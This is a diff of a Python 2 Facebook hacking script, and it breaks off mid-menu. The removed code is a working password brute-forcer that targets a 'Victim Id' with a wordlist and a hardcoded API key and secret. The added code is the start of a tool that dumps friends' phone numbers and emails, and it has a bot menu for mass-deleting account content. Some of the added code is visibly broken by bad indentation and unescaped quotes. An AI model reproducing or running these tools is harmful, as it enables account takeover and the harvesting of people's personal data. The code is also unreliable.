@@ -1,66 +1,138 @@
-import urllib2
-import hashlib
-import requests
-import json
-import random
-import sys
-import os
-os.system("clear")
-class color:
-	r = "\033[1;31m"
-	g = "\033[1;32m"
-	c = "\033[1;36m"
-	b = "\033[1;34m"
-print """
-
-           #######################################
- 	   #				         #
-           # By : Mahmoud_Jony @bang.amen.184    #
-           #					 #
-	   #	     == @bang.amen.184==	         #
-           #					 #
- 	   #      [*] Egyption Hacker [*]        #
-	   #					 #
-           #######################################
-
-"""
-ID = raw_input("{}[{}*{}]{}Enter The Victim Id >> {} ".format(color.g, color.b, color.g, color.r, color.g))
-passlist = raw_input("{}[{}*{}]{}Enter The Password Lsit Path >> {}".format(color.g, color.b, color.g, color.r, color.g))
-os.system("clear")
-print """
-
-           #######################################
-           #                                     #
-           # By : Mahmoud_Jony @bang.amen.184       #
-           #                                     #
-           #                                     #
-           #      [*] Egyption Hacker [*]        #
-           #                                     #
-           #######################################
-
-"""
-def get(data):
+###################################################################
+#                        Import Module
+import json , sys , hashlib , os , time , marshal
+###################################################################
+'''
+     Jangan Direcode ya bosku , tinggal make apa susahnya sih
+'''
+###################################################################
+#                             COLOR
+if sys.platform in ["linux","linux2"]:
+	W = "\033[0m"
+        G = '\033[32;1m'
+        R = '\033[31;1m'
+else:
+	W = ''
+	G = ''
+	R = ''
+###################################################################
+#                      Exception
+try:
+	import requests
+except ImportError:
+	print R + '_     _'.center(44)
+	print "o' \.=./ `o".center(44)
+	print '(o o)'.center(44)
+	print 'ooO--(_)--Ooo'.center(44)
+	print W + ' '
+	print ('Jony . Shark's ').center(44)
+	print ' '
+	print "[!] Can't import module 'requests'\n"
+	sys.exit()
+####################################################################
+#                    Set Default encoding
+reload (sys)
+sys . setdefaultencoding ( 'utf8' )
+####################################################################
+#       	        I don't know
+jml = []
+jmlgetdata = []
+n = []
+####################################################################
+#                        BANNER
+def baliho():
 	try:
-		sys.stdout.write("[*]Trying > {}".format(passwd))
-                sys.stdout.flush()
-		r = requests.get('https://api.facebook.com/restserver.php',params=data)
+		token = open('cookie/token.log','r').read()
+		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
 		a = json.loads(r.text)
-		if a["access_token"]:
-		    os.system("clear")
-		    print color.r
-		    print "[#] Password Attacked >>{} ".format(passwd)
-		    sys.exit()
-	except KeyError:
-		print ""
-	except KeyboardInterrupt:
-		sys.exit()
-def id(pswd):
-        id = ID;pwd = pswd;API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
-        x = hashlib.new('md5')
-        x.update(sig)
-        data.update({'sig':x.hexdigest()})
-        get(data)
-opn = open(passlist, "r")
-rd = opn.readlines()
-for passwd in rd:
-    id(passwd)
+		name = a['name']
+		n.append(a['name'])
+
+		print R + '_     _'.center(44)
+		print "o' \.=./ `o".center(44)
+		print '(o o)'.center(44)
+		print 'ooO--(_)--Ooo'.center(44)
+		print ' ' + W
+		print ('[] ' + name + ' []').center(44)
+		print ' '
+
+	except (KeyError,IOError):
+		print R + '_     _'.center(44)
+		print "o' \.=./ `o".center(44)
+		print '(o o)'.center(44)
+		print 'ooO--(_)--Ooo'.center(44)
+		print ' ' + W
+		print ('Shark's').center(44)
+		print (W + '     [' + G +'Open Source Information Facebook'+ W + ']')
+		print ' '
+####################################################################
+#		    Print In terminal
+def show_program():
+
+	print '''
+                    %sINFORMATION%s
+ ------------------------------------------------------
+
+    Author     Debby Anggraini 'CiKu370'
+    Name       Shark's 'Open Source Information Facebook'
+    CodeName   Jony
+    version    full version
+    Date       25/01/2019 09:35:12
+    Team       Blackhole Security
+    Email      jony6sex@gmail.com
+    Telegram   @Jony6sex
+
+* if you find any errors or problems , please contact
+  author
+'''%(G,W)
+def info_ga():
+
+	print '''
+     %sCOMMAND                      DESCRIPTION%s
+  -------------       -------------------------------------
+
+   get_data           fetching all friends data
+   get_info           show information about your friend
+
+   dump_id            fetching all id from friend list
+   dump_phone         fetching all phone number from friend list
+   dump_mail          fetching all emails from friend list
+   dump_<id>_id       fetching all id from your friends <spesific>
+		      ex: dump_username_id
+
+   token              Generate access token
+   cat_token          show your access token
+   rm_token           remove access token
+
+   bot                open bot menu
+
+   clear              clear terminal
+   help               show help
+   about              Show information about this program
+   exit               Exit the program
+'''%(G,W)
+def menu_bot():
+	print '''
+   %sNumber                  INFO%s
+ ---------   ------------------------------------
+
+   [ 01 ]      auto reactions
+   [ 02 ]      auto comment
+   [ 03 ]      auto poke
+   [ 04 ]      accept all friend requests
+   [ 05 ]      delete all posts in your timeline
+   [ 06 ]      delete all friends
+   [ 07 ]      stop following all friends
+   [ 08 ]      delete all photo albums
+
+   [ 00 ]      back to main menu
+'''%(G,W)
+def menu_reaction():
+	print '''
+   %sNumber                  INFO%s
+ ----------   ------------------------------------
+
+   [ 01 ]      like
+   [ 02 ]      reaction 'LOVE'
+   [ 03 ]      reaction 'WOW'
+   [ 0
